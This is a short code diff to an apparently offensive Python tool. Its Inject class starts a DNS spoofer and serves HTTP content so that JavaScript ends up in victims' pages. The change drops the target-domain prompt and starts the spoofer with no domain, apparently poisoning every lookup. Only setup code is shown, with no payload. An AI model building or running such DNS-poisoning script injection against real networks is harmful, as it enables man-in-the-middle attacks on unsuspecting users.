@@ -9,12 +9,7 @@ import threading
 
 class Inject(object):
 
-	def __init__(self, host, port, js, url):
-                if url != None:
-                	self.url = url
-                else:
-                        try: self.url = raw_input("[+] Enter the domain to inject the script: ")
-                        except KeyboardInterrupt: pass
+	def __init__(self, host, port, js):
                 if js != None:
                         self.js = js
                 else:
@@ -57,8 +52,8 @@ Content-Type: text/html
 
 	def server(self):
 		from dnspoisoner import DNSspoof
-                self.dnsspoof = DNSspoof(self.url, self.host)
-                self.dnsspoof.start()
+                self.dnsspoof = DNSspoof(self.host)
+                self.dnsspoof.start(None,"Inject")
 
 		server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 		server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
